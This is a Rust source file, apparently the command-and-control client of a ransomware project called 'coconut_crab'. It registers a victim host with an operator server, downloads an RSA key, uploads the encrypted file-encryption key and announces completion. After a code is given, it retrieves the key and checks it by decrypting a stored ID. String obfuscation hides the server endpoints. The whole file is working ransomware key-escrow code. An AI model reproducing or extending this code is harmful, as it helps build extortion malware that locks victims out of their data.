use hex::{FromHex, decode};
use log::{debug, error, info};
use purecrypto::rsa::BoxedRsaPublicKey;
use std::{fs, path::PathBuf, str};

use crate::{crypto::decrypt_string, status::Status};
use coconut_crab_lib::{
    file::write_to_file,
    web::{
        client::{web_get_recv_bytes, web_post_send_json_recv_text},
        structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
        validate::create_proof,
    },
};

pub fn write_asym_pub_key_to_disk(asym_pub_key: &BoxedRsaPublicKey, file_path: &PathBuf) {
    let pem_data = asym_pub_key.to_spki_pem();
    debug!("Successfully converted public key to PEM data: {pem_data}");
    match write_to_file(pem_data.as_bytes(), file_path) {
        Ok(()) => {
            info!(
                "Successfully wrote PEM data to file: {}",
                file_path.display()
            );
        }
        Err(error) => {
            error!("Failed to write PEM data to file: {error}");
        }
    }
}

#[allow(dead_code)]
pub fn import_asym_pub_key(file_path: &PathBuf) -> BoxedRsaPublicKey {
    let pem = fs::read_to_string(file_path).expect("Failed to read PEM file");
    debug!("Read public key PEM data {pem}");
    let public_key =
        BoxedRsaPublicKey::from_spki_pem(&pem).expect("Failed to parse PEM public key");
    debug!("Parsed PEM to public key {public_key:?}");
    public_key
}

pub fn download_asym_pub_key(
    server_fqdn: &str,
    port: u16,
    https: bool,
    verify_server: bool,
) -> Option<BoxedRsaPublicKey> {
    let identifier = if https { "https" } else { "http" };
    let url = format!(
        "{identifier}://{server_fqdn}:{port}{}",
        lc!("/download/asym-pub-key.pem")
    );
    debug!("Asymmetric public key download URL: {url}");
    let content = web_get_recv_bytes(&url, verify_server)?;
    debug!("Response content bytes: {content:?}");
    let public_key = BoxedRsaPublicKey::from_spki_pem(
        str::from_utf8(&content).expect("Failed to parse PEM key string"),
    )
    .expect("Failed to parse PEM key");
    debug!("Asymmetric public key downloaded: {public_key:?}");
    Some(public_key)
}

pub fn register(
    server_fqdn: &str,
    port: u16,
    status: &Status,
    secret: &str,
    https: bool,
    verify_server: bool,
) -> Result<(), String> {
    let identifier = if https { "https" } else { "http" };
    let url = format!("{identifier}://{server_fqdn}:{port}{}", lc!("/register"));
    debug!("Registration URL: {url}");
    let proof_source = [status.id.as_bytes(), status.hostname.as_bytes()].concat();
    debug!("Proof source: {proof_source:?}");
    let registration = Registration {
        id: status.id.clone(),
        hostname: status.hostname.clone(),
        proof: create_proof(&proof_source, secret),
    };
    debug!("Registration data: {registration:?}");
    let Some(content) = web_post_send_json_recv_text(&url, &registration, verify_server) else {
        return Err("No response from server".to_string());
    };
    debug!("Response content text: {content}");
    if content != "Success" {
        return Err(format!("Unexpected registration response: {content}"));
    }
    Ok(())
}

pub fn upload_sym_key(
    server_fqdn: &str,
    port: u16,
    status: &Status,
    secret: &str,
    https: bool,
    verify_server: bool,
) -> Result<(), String> {
    let identifier = if https { "https" } else { "http" };
    let url = format!(
        "{identifier}://{server_fqdn}:{port}{}",
        lc!("/upload-sym-key")
    );
    debug!("Symmetric key upload URL: {url}");
    let proof_source = [
        status.id.as_bytes(),
        status.asymmetrically_encrypted_symmetric_key.as_bytes(),
    ]
    .concat();
    debug!("Proof source: {proof_source:?}");
    let uploadsymkey = UploadSymKey {
        id: status.id.clone(),
        key: status.asymmetrically_encrypted_symmetric_key.clone(),
        proof: create_proof(&proof_source, secret),
    };
    debug!("Symmetric key upload data: {uploadsymkey:?}");
    let Some(content) = web_post_send_json_recv_text(&url, &uploadsymkey, verify_server) else {
        return Err("No response from server".to_string());
    };
    debug!("Response content text: {content}");
    if content != "Success" {
        return Err(format!("Unexpected upload response: {content}"));
    }
    info!("Successfully uploaded symmetric key");
    Ok(())
}

pub fn announce_completion(
    server_fqdn: &str,
    port: u16,
    status: &Status,
    secret: &str,
    https: bool,
    verify_server: bool,
) -> Result<(), String> {
    let identifier = if https { "https" } else { "http" };
    let url = format!(
        "{identifier}://{server_fqdn}:{port}{}",
        lc!("/announce-completion")
    );
    debug!("Completion announcement URL: {url}");
    let proof_source = status.id.as_bytes().to_vec();
    debug!("Proof source: {proof_source:?}");
    let announcecompletion = AnnounceCompletion {
        id: status.id.clone(),
        proof: create_proof(&proof_source, secret),
    };
    debug!("Completion announcement data: {announcecompletion:?}");
    let Some(content) = web_post_send_json_recv_text(&url, &announcecompletion, verify_server)
    else {
        return Err("No response from server".to_string());
    };
    debug!("Response content text: {content}");
    if content != "Success" {
        return Err(format!(
            "Unexpected completion announcement response: {content}"
        ));
    }
    info!("Successfully announced completion");
    Ok(())
}

fn download_sym_key(
    server_fqdn: &str,
    port: u16,
    status: &Status,
    code: &str,
    secret: &str,
    https: bool,
    verify_server: bool,
) -> Option<[u8; 32]> {
    let identifier = if https { "https" } else { "http" };
    let url = format!(
        "{identifier}://{server_fqdn}:{port}{}",
        lc!("/download-sym-key")
    );
    debug!("Symmetric key download URL: {url}");
    let proof_source = [status.id.as_bytes(), code.as_bytes()].concat();
    debug!("Proof source: {proof_source:?}");
    let downloadsymkey = DownloadSymKey {
        id: status.id.clone(),
        code: code.to_string(),
        proof: create_proof(&proof_source, secret),
    };
    debug!("Symmetric key download data: {downloadsymkey:?}");
    let Some(content) = web_post_send_json_recv_text(&url, &downloadsymkey, verify_server) else {
        info!("Server did not respond to symmetric key request");
        return None;
    };
    debug!("Response content text: {content}");
    let sym_key = match <[u8; 32]>::from_hex(content) {
        Ok(key) => {
            debug!("Successfully got symmetric key from response: {key:?}");
            key
        }
        Err(error) => {
            error!("Text is not symmetric key: {error:?}");
            return None;
        }
    };
    Some(sym_key)
}

pub fn get_sym_key(
    server_fqdn: &str,
    server_port: u16,
    status: &Status,
    code: &str,
    preshared_secret: &str,
    https: bool,
    verify_server: bool,
) -> Option<[u8; 32]> {
    download_sym_key(
        server_fqdn,
        server_port,
        status,
        code,
        preshared_secret,
        https,
        verify_server,
    )
    .map_or_else(
        || {
            info!("Server did not send back a valid symmetric key");
            None
        },
        |key| {
            debug!("Server sent back a valid symmetric key: {key:?}");
            let id_ciphertext = match decode(&status.symmetrically_encrypted_id) {
                Ok(bytes) => bytes,
                Err(error) => {
                    error!("Unable to decode hex encrypted id: {error}");
                    return None;
                }
            };
            let id_nonce = match <[u8; 12]>::from_hex(&status.symmetrically_encrypted_id_nonce) {
                Ok(nonce) => nonce,
                Err(error) => {
                    error!("Unable to decode hex nonce: {error}");
                    return None;
                }
            };
            let id_tag = match <[u8; 16]>::from_hex(&status.symmetrically_encrypted_id_tag) {
                Ok(tag) => tag,
                Err(error) => {
                    error!("Unable to decode hex tag: {error}");
                    return None;
                }
            };
            let decrypt_id_attempt = decrypt_string(
                &id_ciphertext,
                &key,
                &id_nonce,
                &id_tag,
                status.encryption_aad.as_bytes(),
            );
            debug!(
                "Comparing server provided key decrypted ID ({:?}) to known ID ({})",
                decrypt_id_attempt, status.id
            );
            if decrypt_id_attempt.as_deref() == Some(&status.id) {
                info!("Received correct symmetric key from server");
                Some(key)
            } else {
                error!("Received incorrect symmetric key from server");
                None
            }
        },
    )
}
